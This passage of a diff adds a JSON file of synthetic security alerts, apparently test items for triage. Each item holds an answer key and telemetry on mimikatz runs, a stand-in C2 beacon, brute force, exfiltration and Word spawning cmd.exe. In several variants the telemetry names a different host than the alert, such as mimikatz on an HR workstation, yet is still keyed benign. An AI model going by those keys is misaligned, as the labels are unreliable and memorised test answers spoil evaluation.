+     "Operation": "Send",
+     "sender": "campaigns@example.com",
+     "message_count": 22000,
+     "window_minutes": 60
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.55",
+     "hostname": "mkt-sendgrid-relay.example.com",
+     "role": "marketing email relay"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-008-R4",
+   "provenance": "synthetic",
+   "title": "Bulk outbound email from 198.51.100.55",
+   "description": "22,000 messages to external recipients in one hour.",
+   "severity": "medium",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1114.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Bulk outbound email from 198.51.100.55",
+    "severity": "medium"
+   },
+   "telemetry": [
+    {
+     "source": "m365_audit",
+     "Operation": "Send",
+     "sender": "campaigns@example.com",
+     "message_count": 22000,
+     "window_minutes": 60
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.55",
+     "hostname": "mkt-sendgrid-relay.example.com",
+     "role": "marketing email relay"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-009-R1",
+   "provenance": "synthetic",
+   "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+   "description": "mimikatz.exe executed by t.nakamura@example.com.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1003.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-HR-08",
+     "Image": "C:\\Tools\\mimikatz.exe",
+     "User": "EXAMPLE\\t.nakamura"
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "WIN-SEC-LAB01",
+     "role": "detection-engineering lab, isolated VLAN, no domain trust",
+     "owner": "detection-engineering@example.com"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-009-R2",
+   "provenance": "synthetic",
+   "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+   "description": "mimikatz.exe executed by t.nakamura@example.com.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1003.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-DATA-11",
+     "Image": "C:\\Tools\\mimikatz.exe",
+     "User": "EXAMPLE\\t.nakamura"
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "WIN-SEC-LAB01",
+     "role": "detection-engineering lab, isolated VLAN, no domain trust",
+     "owner": "detection-engineering@example.com"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-009-R3",
+   "provenance": "synthetic",
+   "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+   "description": "mimikatz.exe executed by t.nakamura@example.com.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1003.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-OPS-22",
+     "Image": "C:\\Tools\\mimikatz.exe",
+     "User": "EXAMPLE\\t.nakamura"
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "WIN-SEC-LAB01",
+     "role": "detection-engineering lab, isolated VLAN, no domain trust",
+     "owner": "detection-engineering@example.com"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-009-R4",
+   "provenance": "synthetic",
+   "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+   "description": "mimikatz.exe executed by t.nakamura@example.com.",
+   "severity": "critical",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1003.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Credential dumping tool executed on WIN-SEC-LAB01",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-EDGE-02",
+     "Image": "C:\\Tools\\mimikatz.exe",
+     "User": "EXAMPLE\\t.nakamura"
+    },
+    {
+     "source": "asset_inventory",
+     "hostname": "WIN-SEC-LAB01",
+     "role": "detection-engineering lab, isolated VLAN, no domain trust",
+     "owner": "detection-engineering@example.com"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-010-R1",
+   "provenance": "synthetic",
+   "title": "Scheduled task created on 140 hosts",
+   "description": "Identical scheduled task written across 140 endpoints within four minutes.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1053.005"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Scheduled task created on 140 hosts",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4698,
+     "TaskName": "\\Example\\EndpointInventory",
+     "host_count": 140,
+     "window_minutes": 4,
+     "SubjectUserName": "svc-sccm"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041420",
+     "summary": "Roll out endpoint inventory collector to the finance OU"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-010-R2",
+   "provenance": "synthetic",
+   "title": "Scheduled task created on 140 hosts",
+   "description": "Identical scheduled task written across 140 endpoints within four minutes.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1053.005"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Scheduled task created on 140 hosts",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4698,
+     "TaskName": "\\Example\\EndpointInventory",
+     "host_count": 140,
+     "window_minutes": 4,
+     "SubjectUserName": "svc-sccm"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041455",
+     "summary": "Roll out endpoint inventory collector to the finance OU"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-010-R3",
+   "provenance": "synthetic",
+   "title": "Scheduled task created on 140 hosts",
+   "description": "Identical scheduled task written across 140 endpoints within four minutes.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1053.005"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Scheduled task created on 140 hosts",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4698,
+     "TaskName": "\\Example\\EndpointInventory",
+     "host_count": 140,
+     "window_minutes": 4,
+     "SubjectUserName": "svc-sccm"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041487",
+     "summary": "Roll out endpoint inventory collector to the finance OU"
+    }
+   ]
+  },
+  {
+   "id": "INC-BENIGN-010-R4",
+   "provenance": "synthetic",
+   "title": "Scheduled task created on 140 hosts",
+   "description": "Identical scheduled task written across 140 endpoints within four minutes.",
+   "severity": "high",
+   "expected_disposition": "benign",
+   "expected_techniques": [
+    "T1053.005"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Scheduled task created on 140 hosts",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4698,
+     "TaskName": "\\Example\\EndpointInventory",
+     "host_count": 140,
+     "window_minutes": 4,
+     "SubjectUserName": "svc-sccm"
+    },
+    {
+     "source": "itsm",
+     "change_ticket": "CHG0041502",
+     "summary": "Roll out endpoint inventory collector to the finance OU"
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-001-R1",
+   "provenance": "synthetic",
+   "title": "Ransomware file-extension activity on WIN-HR-21",
+   "description": "Rule matched 400 files renamed to a known ransomware extension.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1486"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Ransomware file-extension activity on WIN-HR-21",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "WIN-ENG-17",
+     "TargetFilename": "D:\\archive\\2019-payroll.7z.locked",
+     "Image": "C:\\Program Files\\7-Zip\\7zG.exe",
+     "User": "EXAMPLE\\m.alvarez"
+    },
+    {
+     "source": "edr",
+     "note": "Files were renamed by an archival script appending '.locked' as its own marker.",
+     "entropy_change": "none",
+     "ransom_note_found": false
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-001-R2",
+   "provenance": "synthetic",
+   "title": "Ransomware file-extension activity on WIN-HR-21",
+   "description": "Rule matched 400 files renamed to a known ransomware extension.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1486"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Ransomware file-extension activity on WIN-HR-21",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "LIN-APP-05",
+     "TargetFilename": "D:\\archive\\2019-payroll.7z.locked",
+     "Image": "C:\\Program Files\\7-Zip\\7zG.exe",
+     "User": "EXAMPLE\\m.alvarez"
+    },
+    {
+     "source": "edr",
+     "note": "Files were renamed by an archival script appending '.locked' as its own marker.",
+     "entropy_change": "none",
+     "ransom_note_found": false
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-001-R3",
+   "provenance": "synthetic",
+   "title": "Ransomware file-extension activity on WIN-HR-21",
+   "description": "Rule matched 400 files renamed to a known ransomware extension.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1486"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Ransomware file-extension activity on WIN-HR-21",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "WIN-HR-08",
+     "TargetFilename": "D:\\archive\\2019-payroll.7z.locked",
+     "Image": "C:\\Program Files\\7-Zip\\7zG.exe",
+     "User": "EXAMPLE\\m.alvarez"
+    },
+    {
+     "source": "edr",
+     "note": "Files were renamed by an archival script appending '.locked' as its own marker.",
+     "entropy_change": "none",
+     "ransom_note_found": false
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-001-R4",
+   "provenance": "synthetic",
+   "title": "Ransomware file-extension activity on WIN-HR-21",
+   "description": "Rule matched 400 files renamed to a known ransomware extension.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1486"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Ransomware file-extension activity on WIN-HR-21",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 11,
+     "Computer": "LIN-DATA-11",
+     "TargetFilename": "D:\\archive\\2019-payroll.7z.locked",
+     "Image": "C:\\Program Files\\7-Zip\\7zG.exe",
+     "User": "EXAMPLE\\m.alvarez"
+    },
+    {
+     "source": "edr",
+     "note": "Files were renamed by an archival script appending '.locked' as its own marker.",
+     "entropy_change": "none",
+     "ransom_note_found": false
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-002-R1",
+   "provenance": "synthetic",
+   "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+   "description": "Periodic outbound HTTPS matching a threat-intel indicator.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1071.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "proxy",
+     "src_host": "WIN-OPS-22",
+     "dst_domain": "malware-c2.example.net",
+     "interval_seconds": 300,
+     "bytes_out": 412
+    },
+    {
+     "source": "threatintel",
+     "indicator": "malware-c2.example.net",
+     "note": "Sinkholed by the registrar in 2024; the IOC feed never expired the entry.",
+     "first_seen": "2023-11-02",
+     "sinkholed": true
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-002-R2",
+   "provenance": "synthetic",
+   "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+   "description": "Periodic outbound HTTPS matching a threat-intel indicator.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1071.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "proxy",
+     "src_host": "LIN-EDGE-02",
+     "dst_domain": "malware-c2.example.net",
+     "interval_seconds": 300,
+     "bytes_out": 412
+    },
+    {
+     "source": "threatintel",
+     "indicator": "malware-c2.example.net",
+     "note": "Sinkholed by the registrar in 2024; the IOC feed never expired the entry.",
+     "first_seen": "2023-11-02",
+     "sinkholed": true
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-002-R3",
+   "provenance": "synthetic",
+   "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+   "description": "Periodic outbound HTTPS matching a threat-intel indicator.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1071.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "proxy",
+     "src_host": "WIN-LEG-14",
+     "dst_domain": "malware-c2.example.net",
+     "interval_seconds": 300,
+     "bytes_out": 412
+    },
+    {
+     "source": "threatintel",
+     "indicator": "malware-c2.example.net",
+     "note": "Sinkholed by the registrar in 2024; the IOC feed never expired the entry.",
+     "first_seen": "2023-11-02",
+     "sinkholed": true
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-002-R4",
+   "provenance": "synthetic",
+   "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+   "description": "Periodic outbound HTTPS matching a threat-intel indicator.",
+   "severity": "critical",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1071.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "C2 beacon to malware-c2.example.net from WIN-FIN-09",
+    "severity": "critical"
+   },
+   "telemetry": [
+    {
+     "source": "proxy",
+     "src_host": "LIN-CI-09",
+     "dst_domain": "malware-c2.example.net",
+     "interval_seconds": 300,
+     "bytes_out": 412
+    },
+    {
+     "source": "threatintel",
+     "indicator": "malware-c2.example.net",
+     "note": "Sinkholed by the registrar in 2024; the IOC feed never expired the entry.",
+     "first_seen": "2023-11-02",
+     "sinkholed": true
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-003-R1",
+   "provenance": "synthetic",
+   "title": "Brute force against svc-monitoring from 198.51.100.90",
+   "description": "620 failed authentications in ten minutes.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1110.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Brute force against svc-monitoring from 198.51.100.90",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4625,
+     "TargetUserName": "svc-monitoring",
+     "IpAddress": "198.51.100.90",
+     "failure_count": 620,
+     "Status": "0xC000006A"
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.90",
+     "hostname": "nagios-01.example.com",
+     "note": "Credential rotated 2026-03-03; the monitoring host kept the old secret in its config."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-003-R2",
+   "provenance": "synthetic",
+   "title": "Brute force against svc-monitoring from 198.51.100.90",
+   "description": "620 failed authentications in ten minutes.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1110.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Brute force against svc-monitoring from 198.51.100.90",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4625,
+     "TargetUserName": "svc-monitoring",
+     "IpAddress": "198.51.100.90",
+     "failure_count": 620,
+     "Status": "0xC000006A"
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.90",
+     "hostname": "nagios-01.example.com",
+     "note": "Credential rotated 2026-03-03; the monitoring host kept the old secret in its config."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-003-R3",
+   "provenance": "synthetic",
+   "title": "Brute force against svc-monitoring from 198.51.100.90",
+   "description": "620 failed authentications in ten minutes.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1110.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Brute force against svc-monitoring from 198.51.100.90",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4625,
+     "TargetUserName": "svc-monitoring",
+     "IpAddress": "198.51.100.90",
+     "failure_count": 620,
+     "Status": "0xC000006A"
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.90",
+     "hostname": "nagios-01.example.com",
+     "note": "Credential rotated 2026-03-03; the monitoring host kept the old secret in its config."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-003-R4",
+   "provenance": "synthetic",
+   "title": "Brute force against svc-monitoring from 198.51.100.90",
+   "description": "620 failed authentications in ten minutes.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1110.001"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Brute force against svc-monitoring from 198.51.100.90",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "windows_event",
+     "EventID": 4625,
+     "TargetUserName": "svc-monitoring",
+     "IpAddress": "198.51.100.90",
+     "failure_count": 620,
+     "Status": "0xC000006A"
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.90",
+     "hostname": "nagios-01.example.com",
+     "note": "Credential rotated 2026-03-03; the monitoring host kept the old secret in its config."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-004-R1",
+   "provenance": "synthetic",
+   "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+   "description": "Large sustained outbound transfer to an external address.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1048"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_host": "WIN-HR-08",
+     "dst_ip": "198.51.100.200",
+     "bytes_out": 15032385536,
+     "duration_minutes": 46
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.200",
+     "hostname": "artifact-mirror.example.com",
+     "note": "Internal artifact mirror. Classified external by the rule because it sits outside the RFC1918 ranges the rule checks."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-004-R2",
+   "provenance": "synthetic",
+   "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+   "description": "Large sustained outbound transfer to an external address.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1048"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_host": "LIN-DATA-11",
+     "dst_ip": "198.51.100.200",
+     "bytes_out": 15032385536,
+     "duration_minutes": 46
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.200",
+     "hostname": "artifact-mirror.example.com",
+     "note": "Internal artifact mirror. Classified external by the rule because it sits outside the RFC1918 ranges the rule checks."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-004-R3",
+   "provenance": "synthetic",
+   "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+   "description": "Large sustained outbound transfer to an external address.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1048"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_host": "WIN-OPS-22",
+     "dst_ip": "198.51.100.200",
+     "bytes_out": 15032385536,
+     "duration_minutes": 46
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.200",
+     "hostname": "artifact-mirror.example.com",
+     "note": "Internal artifact mirror. Classified external by the rule because it sits outside the RFC1918 ranges the rule checks."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-004-R4",
+   "provenance": "synthetic",
+   "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+   "description": "Large sustained outbound transfer to an external address.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1048"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Data exfiltration: 14 GB uploaded from LIN-APP-12",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "netflow",
+     "src_host": "LIN-EDGE-02",
+     "dst_ip": "198.51.100.200",
+     "bytes_out": 15032385536,
+     "duration_minutes": 46
+    },
+    {
+     "source": "asset_inventory",
+     "ip": "198.51.100.200",
+     "hostname": "artifact-mirror.example.com",
+     "note": "Internal artifact mirror. Classified external by the rule because it sits outside the RFC1918 ranges the rule checks."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-005-R1",
+   "provenance": "synthetic",
+   "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+   "description": "Office application spawned a command shell.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1566.001",
+    "T1059.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-LEG-14",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "CommandLine": "cmd.exe /c \"C:\\Legal\\merge-templates.bat\"",
+     "User": "EXAMPLE\\r.devlin"
+    },
+    {
+     "source": "vcs",
+     "note": "merge-templates.bat is a reviewed document-assembly macro deployed to the legal OU in 2021."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-005-R2",
+   "provenance": "synthetic",
+   "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+   "description": "Office application spawned a command shell.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1566.001",
+    "T1059.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "LIN-CI-09",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "CommandLine": "cmd.exe /c \"C:\\Legal\\merge-templates.bat\"",
+     "User": "EXAMPLE\\r.devlin"
+    },
+    {
+     "source": "vcs",
+     "note": "merge-templates.bat is a reviewed document-assembly macro deployed to the legal OU in 2021."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-005-R3",
+   "provenance": "synthetic",
+   "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+   "description": "Office application spawned a command shell.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1566.001",
+    "T1059.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-DB-31",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "CommandLine": "cmd.exe /c \"C:\\Legal\\merge-templates.bat\"",
+     "User": "EXAMPLE\\r.devlin"
+    },
+    {
+     "source": "vcs",
+     "note": "merge-templates.bat is a reviewed document-assembly macro deployed to the legal OU in 2021."
+    }
+   ]
+  },
+  {
+   "id": "INC-FP-005-R4",
+   "provenance": "synthetic",
+   "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+   "description": "Office application spawned a command shell.",
+   "severity": "high",
+   "expected_disposition": "false_positive",
+   "expected_techniques": [
+    "T1566.001",
+    "T1059.003"
+   ],
+   "expected_actions": [],
+   "raw_alert": {
+    "title": "Suspicious parent-child: winword.exe spawning cmd.exe on WIN-LEG-03",
+    "severity": "high"
+   },
+   "telemetry": [
+    {
+     "source": "sysmon",
+     "EventID": 1,
+     "Computer": "WIN-FIN-03",
+     "Image": "C:\\Windows\\System32\\cmd.exe",
+     "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+     "CommandLine": "cmd.exe /c \"C:\\Legal\\merge-templates.bat\"",
+     "User": "EXAMPLE\\r.devlin"
+    },
+    {
+     "source": "vcs",
+     "note": "merge-templates.bat is a reviewed document-assembly macro deployed to the legal OU in 2021."
+    }
    ]
   }
  ]
